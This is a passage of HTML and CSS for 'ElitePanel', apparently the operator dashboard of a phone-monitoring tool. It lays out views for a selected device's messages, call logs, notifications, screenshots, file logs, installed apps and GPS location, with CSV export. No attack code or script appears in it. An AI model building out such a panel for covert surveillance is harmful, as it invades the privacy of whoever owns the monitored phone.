<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel Elite - Device Monitoring</title>
    
    <!-- Google Fonts: Inter (Modern, Clean UI Font) -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

    <!-- Bootstrap 5 CSS (Base for layout) -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- Font Awesome CSS (Using v6 for more icon options) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <!-- Leaflet CSS (for GPS Map) -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />

    <style>
        :root {
            --primary-color: #4F46E5; /* Indigo-600 from Tailwind as a modern primary */
            --primary-color-rgb: 79, 70, 229;
            --primary-hover-color: #4338CA; /* Indigo-700 */
            --primary-light-bg: rgba(79, 70, 229, 0.08); /* Lighter bg for hover/ subtle elements */
            
            --secondary-color: #10B981; /* Emerald-500 for success/online status */

            --light-bg: #F8FAFC; /* Slate-50 */
            --sidebar-bg: #FFFFFF;
            --content-bg: #FFFFFF;
            
            --text-color-dark: #1E293B;  /* Slate-800 */
            --text-color-medium: #475569; /* Slate-600 */
            --text-color-light: #94A3B8;  /* Slate-400 */
            
            --border-color-soft: #E2E8F0; /* Slate-200 */
            --border-color-medium: #CBD5E1; /* Slate-300 */

            --card-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.07), 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --card-shadow-hover: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            
            --font-family-sans-serif: 'Inter', sans-serif;
            --border-radius-sm: 0.375rem; /* 6px */
            --border-radius-md: 0.5rem;   /* 8px */
            --border-radius-lg: 0.75rem;  /* 12px */

            --toast-bg-success: #D1FAE5;
            --toast-text-success: #065F46;
            --toast-border-success: #6EE7B7;
            --toast-bg-error: #FEE2E2;
            --toast-text-error: #991B1B;
            --toast-border-error: #FCA5A5;
            --toast-bg-info: #DBEAFE;
            --toast-text-info: #1E40AF;
            --toast-border-info: #93C5FD;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: var(--font-family-sans-serif);
            background-color: var(--light-bg);
            color: var(--text-color-medium);
            line-height: 1.65;
            font-size: 15px; /* Slightly smaller base for more content fit */
        }

        /* --- Login Screen --- */
        .login-container {
            max-width: 400px;
            margin: 5rem auto;
            padding: 2.5rem; /* Increased padding */
            background-color: var(--content-bg);
            border-radius: var(--border-radius-lg);
            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1), 0 10px 10px -5px rgba(0,0,0,0.04);
        }
        .login-container h2 {
            font-weight: 700;
            color: var(--text-color-dark);
            font-size: 1.75rem;
        }
        .login-container .form-control {
            border-radius: var(--border-radius-md);
            padding: 0.85rem 1.1rem;
            border: 1px solid var(--border-color-medium);
            background-color: var(--light-bg); /* Subtle background for inputs */
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }
        .login-container .form-control:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(var(--primary-color-rgb), 0.2);
            background-color: var(--content-bg);
        }
        .login-container .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            border-radius: var(--border-radius-md);
            padding: 0.85rem;
            font-weight: 600;
            font-size: 1rem;
            transition: background-color 0.2s ease, transform 0.1s ease;
        }
        .login-container .btn-primary:hover {
            background-color: var(--primary-hover-color);
            border-color: var(--primary-hover-color);
            transform: translateY(-1px);
        }
        .login-container .btn-primary:active {
            transform: translateY(0px);
        }

        /* --- Dashboard --- */
        #dashboard-screen {
            display: flex;
            min-height: 100vh;
        }

        /* --- Sidebar --- */
        #sidebar {
            width: 270px; /* Slightly wider */
            background-color: var(--sidebar-bg);
            border-right: 1px solid var(--border-color-soft);
            padding: 1.25rem 0;
            transition: margin-left 0.35s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            flex-direction: column;
        }
        #sidebar .sidebar-header {
            padding: 0 1.25rem 1.25rem 1.25rem;
            margin-bottom: 0.75rem;
        }
        #sidebar .sidebar-header h4 {
            font-weight: 700;
            color: var(--primary-color);
            font-size: 1.5rem; /* Larger brand */
            display: flex;
            align-items: center;
        }
        #sidebar .sidebar-header h4 i {
            margin-right: 0.65rem;
            font-size: 1.3em;
        }
        #sidebar .nav-link {
            color: var(--text-color-medium);
            padding: 0.8rem 1.5rem; /* Adjusted padding */
            margin: 0.15rem 1rem; /* Reduced vertical margin, increased horizontal */
            border-radius: var(--border-radius-md);
            display: flex;
            align-items: center;
            font-weight: 500; /* Medium weight for nav links */
            transition: background-color 0.2s ease, color 0.2s ease, transform 0.15s ease;
            font-size: 0.95rem;
        }
        #sidebar .nav-link .fa-fw { /* Use fa-fw for fixed width icons */
            margin-right: 1rem; /* Increased margin */
            font-size: 1.05em; /* Slightly larger icons */
            width: 22px; /* Ensure fixed width */
        }
        #sidebar .nav-link:hover {
            background-color: var(--primary-light-bg);
            color: var(--primary-color);
            transform: translateX(3px);
        }
        #sidebar .nav-link.active {
            background-color: var(--primary-color);
            color: #fff;
            font-weight: 600; /* Bolder active link */
            box-shadow: 0 4px 10px -2px rgba(var(--primary-color-rgb), 0.3);
        }
        #sidebar .nav-link.active i {
            color: #fff;
        }
        #sidebar .nav-link.active:hover {
             transform: translateX(0); /* No transform on active hover */
        }


        /* --- Main Content Wrapper --- */
        #main-content-wrapper {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden; 
        }

        /* --- Topbar --- */
        #topbar {
            background-color: var(--content-bg);
            border-bottom: 1px solid var(--border-color-soft);
            padding: 0.85rem 1.75rem; /* Increased padding */
            display: flex;
            justify-content: space-between;
            align-items: center;
            min-height: 70px; /* Increased height */
            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.03);
        }
        #topbar #menu-toggle {
            display: none;
            background: transparent;
            border: none;
            font-size: 1.35rem;
            color: var(--text-color-medium);
            padding: 0.5rem;
            border-radius: var(--border-radius-sm);
        }
        #topbar #menu-toggle:hover {
            color: var(--primary-color);
            background-color: var(--primary-light-bg);
        }
        #topbar #uid-selector {
            border-radius: var(--border-radius-md);
            font-size: 0.9rem;
            padding: 0.45rem 0.85rem;
            border-color: var(--border-color-medium);
            min-width: 180px; /* Give it some base width */
        }
         #topbar #uid-selector:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px rgba(var(--primary-color-rgb), 0.2);
        }
        #topbar #admin-email {
            font-size: 0.9rem;
            color: var(--text-color-medium);
            font-weight: 500;
        }
        #topbar #logout-button {
            border-radius: var(--border-radius-md);
            font-weight: 500;
            padding: 0.45rem 0.9rem;
        }
        #topbar #logout-button i {
            margin-right: 0.4rem;
        }

        /* --- Content Area --- */
        main#main-content-area { /* ID for specificity */
            padding: 1.75rem; 
            overflow-y: auto;
            flex-grow: 1;
        }
        .content-section {
            background-color: var(--content-bg);
            border-radius: var(--border-radius-lg);
            box-shadow: var(--card-shadow);
            margin-bottom: 1.75rem;
            padding: 1.75rem; 
            opacity: 0;
            transform: translateY(15px);
            transition: opacity 0.45s cubic-bezier(0.4, 0, 0.2, 1), transform 0.45s cubic-bezier(0.4, 0, 0.2, 1);
            display: none; /* Initially hidden, JS will manage */
        }
        .content-section.active-section {
            display: block; /* Managed by JS for animation */
            opacity: 1;
            transform: translateY(0);
        }
        .content-section h2 {
            font-size: 1.6rem; /* Slightly larger titles */
            font-weight: 700; /* Bolder titles */
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid var(--border-color-soft);
            color: var(--text-color-dark);
            display: flex;
            align-items: center;
        }
        .content-section h2 i {
            margin-right: 0.85rem;
            color: var(--primary-color);
            font-size: 0.9em; /* Relative to h2 size */
        }
        
        /* --- Enhanced Table Styling --- */
        .table {
            border-collapse: separate;
            border-spacing: 0;
            width: 100%;
        }
        .table thead th {
            background-color: #F9FAFB; /* Slate-50, very light */
            color: var(--text-color-medium);
            font-weight: 600; /* Bolder headers */
            text-transform: uppercase;
            font-size: 0.7rem; /* Smaller, more discreet header text */
            letter-spacing: 0.075em;
            padding: 0.85rem 1.1rem; /* More padding */
            border-bottom: 2px solid var(--border-color-soft);
            text-align: left;
        }
        .table tbody tr {
            transition: background-color 0.15s ease;
        }
        .table tbody tr:hover {
            background-color: var(--primary-light-bg); 
        }
        .table tbody td {
            padding: 0.95rem 1.1rem; /* More padding for cells */
            vertical-align: middle;
            border-bottom: 1px solid var(--border-color-soft);
            font-size: 0.9rem;
            color: var(--text-color-dark); /* Darker text for table data */
        }
         .table tbody td .text-muted { color: var(--text-color-light) !important; }
        .table tbody tr:last-child td {
            border-bottom: none;
        }

        /* Search Input */
        .search-input {
            max-width: 400px; /* Or adjust as needed */
            margin-bottom: 1rem; /* Add some space below it */
        }


        /* --- Loading, No Data & Error States --- */
        .loading-spinner-container, .no-data-message-container, .error-message-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 3.5rem 1rem;
            color: var(--text-color-medium);
            min-height: 250px;
            border: 2px dashed var(--border-color-soft);
            border-radius: var(--border-radius-md);
            background-color: #FCFDFD; /* Very light, almost white */
        }
        .loading-spinner-container .spinner-border {
            width: 3.5rem;
            height: 3.5rem;
            color: var(--primary-color);
            margin-bottom: 1.25rem;
        }
        .loading-spinner-container p, .no-data-message-container p, .error-message-container p {
            font-size: 1.05rem;
            font-weight: 500;
        }
        .no-data-message-container i.fa-xl, .error-message-container i.fa-xl { 
            font-size: 3.5rem; /* Larger icon */
            margin-bottom: 1.25rem;
            color: var(--text-color-light); 
        }
        .error-message-container i.fa-xl {
            color: #EF4444; /* Red-500 for error icon */
        }
         .error-message-container p {
            color: var(--text-color-dark); /* Darker text for error messages */
        }


        /* --- Specific Elements Styling --- */
        .screenshot-item {
            position: relative;
            overflow: hidden;
            border-radius: var(--border-radius-md);
            box-shadow: var(--card-shadow);
        }
        .screenshot-item img {
            display: block;
            width: 160px; /* Slightly larger */
            height: 160px;
            object-fit: cover; /* Ensures image covers the area, might crop */
            margin: 0; 
            border: none; 
            border-radius: 0;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .screenshot-item:hover img {
            transform: scale(1.1);
        }
         .screenshot-item::after { /* Overlay for timestamp */
            content: attr(data-timestamp);
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0) 100%);
            color: white;
            padding: 0.75rem 0.5rem 0.35rem 0.5rem;
            font-size: 0.7rem;
            text-align: center;
            opacity: 0;
            transition: opacity 0.3s ease;
            pointer-events: none;
        }
        .screenshot-item:hover::after {
            opacity: 1;
        }

        #gps-map {
            height: 480px; /* Increased height */
            width: 100%;
            border-radius: var(--border-radius-md);
            border: 1px solid var(--border-color-medium);
        }
        .list-group-item {
            border-color: var(--border-color-soft);
            padding: 0.9rem 1.35rem;
            background-color: transparent; /* For use within cards */
            color: var(--text-color-dark);
        }
        .list-group-item strong { font-weight: 600; }
        .list-group-item .badge { font-size: 0.85em; padding: .4em .7em }

        .btn-info {
            background-color: #06B6D4; /* Cyan-500 */
            border-color: #06B6D4;
            color: white;
        }
        .btn-info:hover {
            background-color: #0891B2; /* Cyan-600 */
            border-color: #0891B2;
        }

        /* Export Button Styling */
        .btn-sm.export-csv-btn {
            padding: 0.5rem 1rem;
            font-size: 0.875rem;
            font-weight: 500;
            border-radius: var(--border-radius-md);
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            color: white;                        
            transition: background-color 0.2s ease, border-color 0.2s ease;
        }
        .btn-sm.export-csv-btn:hover {
            background-color: var(--primary-hover-color); 
            border-color: var(--primary-hover-color);
        }
        .btn-sm.export-csv-btn i { margin-right: 0.4rem; }        

        /* Editable Alias */
        #device-alias-display { font-weight: 600; color: var(--text-color-dark); }
        #edit-alias-btn { 
            margin-left: 0.6rem; 
            color: var(--text-color-light);
            border: 1px solid transparent; /* for alignment */
        }
        #edit-alias-btn:hover { color: var(--primary-color); background-color: var(--primary-light-bg); }
        #edit-alias-form { max-width: 320px; }
        #edit-alias-form .form-control-sm { border-radius: var(--border-radius-sm); }
        #edit-alias-form .btn-sm { border-radius: var(--border-radius-sm); }


        /* Responsive Sidebar */
        @media (max-width: 992px) { 
            #sidebar {
                margin-left: -270px;
                position: fixed;
                top: 0;
                bottom: 0;
                z-index: 1040; 
                height: 100%;
                overflow-y: auto;
                box-shadow: 4px 0 15px rgba(0,0,0,0.1); /* Shadow for mobile sidebar */
            }
            #sidebar.active {
                margin-left: 0;
            }
            #main-content-wrapper {
                width: 100%;
            }
            #topbar #menu-toggle {
                display: block;
            }
        }
        @media (max-width: 576px) {
            main#main-content-area { padding: 1rem; }
            .content-section { padding: 1rem; }
            .content-section h2 { font-size: 1.3rem; margin-bottom: 1rem; padding-bottom: 0.75rem; }
            .content-section h2 i { margin-right: 0.6rem; }
            .table thead th, .table tbody td { padding: 0.7rem 0.8rem; font-size: 0.85rem;}
            #topbar { padding: 0.6rem 1rem; min-height: 60px; }
            #topbar .ms-2.d-none.d-sm-inline, #topbar #admin-email { 
                display: none !important;
            }
            #topbar #uid-selector { max-width: 140px; font-size: 0.8rem; }
            .search-input { max-width: 100%; }
        }

        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }
        ::-webkit-scrollbar-track {
            background: var(--light-bg);
            border-radius: 10px;
        }
        ::-webkit-scrollbar-thumb {
            background: var(--border-color-medium);
            border-radius: 10px;
            border: 2px solid var(--light-bg); /* Creates padding around thumb */
        }
        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-color-light);
        }

        /* Toast Styling */
        .toast-container {
            z-index: 1090; /* Higher than most elements */
        }
        .toast {
            font-size: 0.9rem;
            border-radius: var(--border-radius-md);
            box-shadow: var(--card-shadow-hover);
        }
        .toast-header {
            font-weight: 600;
            border-bottom: 1px solid rgba(0,0,0,0.05);
        }
        .toast.bg-success-custom {
            background-color: var(--toast-bg-success) !important;
            color: var(--toast-text-success) !important;
            border: 1px solid var(--toast-border-success);
        }
        .toast.bg-success-custom .toast-header {
            background-color: rgba(255,255,255,0.2);
            color: var(--toast-text-success);
            border-bottom: 1px solid var(--toast-border-success);
        }
         .toast.bg-success-custom .btn-close {
            filter: invert(40%) sepia(50%) saturate(500%) hue-rotate(100deg);
        }

        .toast.bg-danger-custom {
            background-color: var(--toast-bg-error) !important;
            color: var(--toast-text-error) !important;
            border: 1px solid var(--toast-border-error);
        }
        .toast.bg-danger-custom .toast-header {
             background-color: rgba(255,255,255,0.2);
            color: var(--toast-text-error);
            border-bottom: 1px solid var(--toast-border-error);
        }
        .toast.bg-danger-custom .btn-close {
             filter: invert(20%) sepia(80%) saturate(800%) hue-rotate(330deg);
        }
        .toast.bg-info-custom {
            background-color: var(--toast-bg-info) !important;
            color: var(--toast-text-info) !important;
            border: 1px solid var(--toast-border-info);
        }
        .toast.bg-info-custom .toast-header {
             background-color: rgba(255,255,255,0.2);
            color: var(--toast-text-info);
            border-bottom: 1px solid var(--toast-border-info);
        }
         .toast.bg-info-custom .btn-close {
            filter: invert(30%) sepia(80%) saturate(600%) hue-rotate(180deg);
        }
        
        .pagination-controls {
            user-select: none;
        }
        .pagination-controls .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

    </style>
</head>
<body>

    <!-- Toast Container -->
    <div class="toast-container position-fixed top-0 end-0 p-3">
        <!-- Toasts will be appended here by JavaScript -->
    </div>

    <!-- Login Screen -->
    <div id="login-screen">
        <div class="container login-container">
            <div class="text-center mb-5">
                 <i class="fas fa-fingerprint fa-3x mb-3" style="color: var(--primary-color);"></i>
                 <h2>Elite Panel Access</h2>
                 <p class="text-muted mt-2">Securely access your device monitoring dashboard.</p>
            </div>
            <form id="login-form">
                <div class="mb-3">
                    <label for="email" class="form-label fw-medium">Email Address</label>
                    <input type="email" class="form-control" id="email" required placeholder="you@example.com">
                </div>
                <div class="mb-4"> <!-- Increased margin bottom -->
                    <label for="password" class="form-label fw-medium">Password</label>
                    <input type="password" class="form-control" id="password" required placeholder="••••••••">
                </div>
                <button type="submit" class="btn btn-primary w-100 mt-2">
                    <i class="fas fa-sign-in-alt me-2"></i>Log In
                </button>
                <div id="login-error" class="text-danger small mt-3 text-center"></div>
            </form>
        </div>
    </div>

    <!-- Dashboard Screen -->
    <div id="dashboard-screen" style="display: none;">
        <!-- Sidebar -->
        <nav id="sidebar">
            <div class="sidebar-header">
                <h4><i class="fas fa-shield-halved"></i> ElitePanel</h4>
            </div>
            <ul class="nav flex-column flex-grow-1">
                <li class="nav-item">
                    <a class="nav-link active" href="#" data-section="device-overview"><i class="fas fa-tachometer-alt fa-fw"></i> Overview</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="messages"><i class="fas fa-comments fa-fw"></i> Messages</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="call-logs"><i class="fas fa-phone-alt fa-fw"></i> Call Logs</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="installed-apps"><i class="fas fa-cubes fa-fw"></i> Installed Apps</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="battery-info"><i class="fas fa-battery-three-quarters fa-fw"></i> Battery</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="gps-location"><i class="fas fa-map-location-dot fa-fw"></i> GPS Location</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="file-logs"><i class="fas fa-folder-open fa-fw"></i> File Logs</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="screenshots"><i class="fas fa-camera-retro fa-fw"></i> Screenshots</a>
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="notifications"><i class="fas fa-bell fa-fw"></i> Notifications</a> <!-- Corrected Icon -->
                </li>
                <li class="nav-item">
                    <a class="nav-link" href="#" data-section="device-info"><i class="fas fa-server fa-fw"></i> Device Info</a>
                </li>
            </ul>
             <div class="p-3 mt-auto text-center border-top border-top-1" style="font-size:0.8rem; color: var(--text-color-light);">
                <i class="far fa-copyright"></i> ElitePanel v2.1 <!-- Version Updated -->
            </div>
        </nav>

        <!-- Main Content Wrapper -->
        <div id="main-content-wrapper">
            <!-- Topbar -->
            <nav id="topbar">
                <div class="d-flex align-items-center">
                    <button class="btn btn-light me-3" id="menu-toggle" aria-label="Toggle Menu"><i class="fas fa-bars"></i></button>
                    <span class="ms-1 d-none d-sm-inline fw-medium" style="color: var(--text-color-dark);">Device:</span>
                    <select id="uid-selector" class="form-select form-select-sm d-inline-block w-auto ms-2"></select>
                </div>
                <div class="d-flex align-items-center">
                    <span id="admin-email" class="me-3">user@example.com</span>
                    <button id="logout-button" class="btn btn-outline-danger btn-sm">
                        <i class="fas fa-sign-out-alt"></i> Logout
                    </button>
                </div>
            </nav>

            <!-- Content Area -->
            <main id="main-content-area">
                <!-- Device Overview -->
                <div id="device-overview-content" class="content-section">
                    <h2><i class="fas fa-tachometer-alt"></i> Device Overview</h2>
                    <div id="device-overview-data">
                        <div class="row gy-3"> <!-- gy-3 for vertical gutter -->
                            <div class="col-lg-7 col-md-12">
                                <strong class="text-muted">Device Alias:</strong> 
                                <span id="device-alias-display" class="fs-5 me-2">N/A</span>
                                <button id="edit-alias-btn" class="btn btn-sm btn-light py-0 px-1 border-0" title="Edit Alias" aria-label="Edit Alias"><i class="fas fa-pencil-alt"></i></button>
                                <div id="edit-alias-form" style="display:none;" class="mt-1 input-group input-group-sm">
                                    <input type="text" id="device-alias-input" class="form-control form-control-sm">
                                    <button id="save-alias-btn" class="btn btn-sm btn-primary">Save</button>
                                    <button id="cancel-alias-btn" class="btn btn-sm btn-secondary">Cancel</button>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-6"><strong class="text-muted">Status:</strong> <span id="device-status">N/A</span></div>
                            <div class="col-lg-3 col-md-6"><strong class="text-muted">Last Seen:</strong> <span id="device-last-seen">N/A</span></div>
                        </div>
                    </div>
                    <div class="loading-spinner-container" style="display:none;"><div class="spinner-border"></div><p>Loading Overview...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-binoculars fa-xl"></i><p>No overview data available for the selected device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load overview data.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="device-overview"><i class="fas fa-file-csv"></i> Export Overview</button>
                </div>

                <!-- Messages -->
                <div id="messages-content" class="content-section">
                    <h2><i class="fas fa-comments"></i> Messages</h2>
                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in From/To or Message Body..." data-sectionkey="messages">
                    <div class="table-responsive">
                        <table class="table table-hover">
                            <thead><tr><th>Date</th><th>From/To</th><th>Message Body</th><th>Type</th></tr></thead>
                            <tbody id="messages-table-body"></tbody>
                        </table>
                    </div>
                    <div class="pagination-controls mt-3 text-center" style="display: none;">
                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="messages">Previous</button>
                        <span class="page-info mx-2">Page 1</span>
                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="messages">Next</button>
                    </div>
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Messages...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-comment-dots fa-xl"></i><p>No messages found for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load messages.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="sms"><i class="fas fa-file-csv"></i> Export Messages</button>
                </div>

                <!-- Call Logs -->
                <div id="call-logs-content" class="content-section">
                    <h2><i class="fas fa-phone-alt"></i> Call Logs</h2>
                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in Number..." data-sectionkey="call-logs">
                    <div class="table-responsive">
                        <table class="table table-hover">
                            <thead><tr><th>Date</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead>
                            <tbody id="call-logs-table-body"></tbody>
                        </table>
                    </div>
                    <div class="pagination-controls mt-3 text-center" style="display: none;">
                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="call-logs">Previous</button>
                        <span class="page-info mx-2">Page 1</span>
                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="call-logs">Next</button>
                    </div>
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Call Logs...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-phone-slash fa-xl"></i><p>No call logs recorded for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load call logs.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="calls"><i class="fas fa-file-csv"></i> Export Call Logs</button>
                </div>

                <!-- Installed Apps -->
                <div id="installed-apps-content" class="content-section">
                    <h2><i class="fas fa-cubes"></i> Installed Apps</h2>
                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in App Name or Package Name..." data-sectionkey="installed-apps">
                    <div class="table-responsive">
                        <table class="table table-hover">
                            <thead><tr><th>App Name</th><th>Package Name</th><th>Version</th></tr></thead>
                            <tbody id="installed-apps-table-body"></tbody>
                        </table>
                    </div>
                     <div class="pagination-controls mt-3 text-center" style="display: none;">
                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="installed-apps">Previous</button>
                        <span class="page-info mx-2">Page 1</span>
                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="installed-apps">Next</button>
                    </div>
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading App List...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-box-open fa-xl"></i><p>No installed applications found for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load app list.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="apps"><i class="fas fa-file-csv"></i> Export App List</button>
                </div>

                <!-- Battery Info -->
                <div id="battery-info-content" class="content-section">
                    <h2><i class="fas fa-battery-three-quarters"></i> Battery Status</h2>
                    <div id="battery-info-data" class="list-group list-group-flush"></div> <!-- list-group-flush for cards -->
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Fetching Battery Info...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-battery-empty fa-xl"></i><p>Battery information unavailable for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load battery information.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="battery"><i class="fas fa-file-csv"></i> Export Battery Info</button>
                </div>

                <!-- GPS Location -->
                <div id="gps-location-content" class="content-section">
                    <h2><i class="fas fa-map-location-dot"></i> GPS Location</h2>
                    <div id="gps-map" class="mb-3"></div>
                    <div id="gps-info-data" class="list-group list-group-flush"></div>
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Acquiring GPS Data...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-compass-slash fa-xl"></i><p>No GPS data found or reported for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load GPS data.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="gps"><i class="fas fa-file-csv"></i> Export GPS Data</button>
                </div>

                <!-- File Logs -->
                <div id="file-logs-content" class="content-section">
                    <h2><i class="fas fa-folder-open"></i> File Logs</h2>
                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in Path..." data-sectionkey="file-logs">
                     <div class="table-responsive">
                        <table class="table table-hover">
                            <thead><tr><th>Path</th><th>Size</th><th>Last Modified</th></tr></thead>
                            <tbody id="file-logs-table-body"></tbody>
                        </table>
                    </div>
                    <div class="pagination-controls mt-3 text-center" style="display: none;">
                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="file-logs">Previous</button>
                        <span class="page-info mx-2">Page 1</span>
                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="file-logs">Next</button>
                    </div>
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading File Logs...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="far fa-file-excel fa-xl"></i><p>No file activity logged for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load file logs.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="files"><i class="fas fa-file-csv"></i> Export File Logs</button>
                </div>

                <!-- Screenshots -->
                <div id="screenshots-content" class="content-section">
                    <h2><i class="fas fa-camera-retro"></i> Screenshots Gallery</h2>
                    <div id="screenshots-gallery" class="d-flex flex-wrap gap-3 justify-content-center"></div> <!-- gap-3 for spacing -->
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Screenshots...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-image-slash fa-xl"></i><p>No screenshots available for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load screenshots.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="screenshots"><i class="fas fa-file-csv"></i> Export Screenshot URLs</button>
                </div>

                <!-- Notifications -->
                <div id="notifications-content" class="content-section">
                    <h2><i class="fas fa-bell"></i> Notifications Log</h2> <!-- Corrected Icon -->
                    <input type="search" class="form-control form-control-sm search-input mb-3" placeholder="Search in App, Title, or Content..." data-sectionkey="notifications">
                    <div class="table-responsive">
                        <table class="table table-hover">
                            <thead><tr><th>Timestamp</th><th>Application</th><th>Title</th><th>Content</th></tr></thead>
                            <tbody id="notifications-table-body"></tbody>
                        </table>
                    </div>
                    <div class="pagination-controls mt-3 text-center" style="display: none;">
                        <button class="btn btn-sm btn-outline-primary prev-page-btn" data-sectionkey="notifications">Previous</button>
                        <span class="page-info mx-2">Page 1</span>
                        <button class="btn btn-sm btn-outline-primary next-page-btn" data-sectionkey="notifications">Next</button>
                    </div>
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Notifications...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-bell-slash fa-xl"></i><p>No notifications captured for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load notifications.</p></div>
                    <button class="btn btn-sm export-csv-btn btn-info mt-4" data-section="notifications"><i class="fas fa-file-csv"></i> Export Notifications</button>
                </div>

                <!-- Device Info -->
                <div id="device-info-content" class="content-section">
                    <h2><i class="fas fa-server"></i> Device Information</h2>
                    <div id="device-info-data" class="list-group list-group-flush"></div>
                    <div class="loading-spinner-container"><div class="spinner-border"></div><p>Loading Device Details...</p></div>
                    <div class="no-data-message-container" style="display:none;"><i class="fas fa-microchip fa-xl"></i><p>Device information not available for this device.</p></div>
                    <div class="error-message-container" style="display:none;"><i class="fas fa-exclamation-triangle fa-xl"></i><p class="error-text">Failed to load device information.</p></div>
